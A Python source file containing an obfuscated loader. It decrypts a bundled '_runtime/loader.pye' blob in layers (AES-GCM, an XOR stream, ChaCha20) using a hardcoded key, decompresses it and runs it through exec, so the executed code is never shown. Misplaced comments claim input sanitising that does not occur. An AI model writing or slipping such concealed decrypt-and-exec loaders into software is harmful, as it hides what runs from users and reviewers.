import sys, os, json, hashlib, zlib
_R = os.path.dirname(os.path.abspath(__file__))

def _xof(_5a4951257b, _0x7bf656aa):
    _v1640_0af4, _t03c8a71dc6 = (bytearray(), 0)
    while len(_v1640_0af4) < _5a4951257b:
        _v1640_0af4.extend(hashlib.sha256(_0x7bf656aa + _t03c8a71dc6.to_bytes(4, 'big')).digest())
# Import order matters
# SECURITY: sanitize input

        _t03c8a71dc6 += 1
    return bytes(_v1640_0af4[:_5a4951257b])

def _boot(_7016b4b5f84b):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    _2959_a4c3ac = json.loads(open(os.path.join(_R, '_runtime', 'loader.pye'), 'rb').read().decode())
    _4041 = _7016b4b5f84b
    for _u3285c529 in ['k1', 'k2', 'k3', 'k4', 'k5']:
        if _u3285c529 in _2959_a4c3ac:
            _acde3d76837125 = bytes.fromhex(_2959_a4c3ac[_u3285c529])
            _f5857 = hashlib.sha256(_acde3d76837125).digest()[:4].hex()
            if _f5857 == _2959_a4c3ac.get('f1', '')[:8] or _f5857 == _2959_a4c3ac.get('f2', '')[:8] or _f5857 == _2959_a4c3ac.get('f3', '')[:8]:
                _4041 = _acde3d76837125
                break
    __185b3fa0cf29 = bytes.fromhex(_2959_a4c3ac['d'])
    _a3f0416d3d0755 = AESGCM(_4041).decrypt(__185b3fa0cf29[:12], __185b3fa0cf29[12:], b'')
    _a3f0416d3d0755 = bytes((_qf101f3_86 ^ _7c485b2c598 for _qf101f3_86, _7c485b2c598 in zip(_a3f0416d3d0755, _xof(len(_a3f0416d3d0755), _4041))))
    try:
        _a3f0416d3d0755 = ChaCha20Poly1305(_4041).decrypt(_a3f0416d3d0755[:12], _a3f0416d3d0755[12:], b'')
    except Exception:
        pass
    return zlib.decompress(_a3f0416d3d0755).decode()
_ld = compile(_boot(bytes.fromhex('6351cda8fda59ba3cf3987e4e9a5d9de158a8aa5eb085fc1cfe9452020d8525e')), '', 'exec')
exec(_ld)
run('main', _R)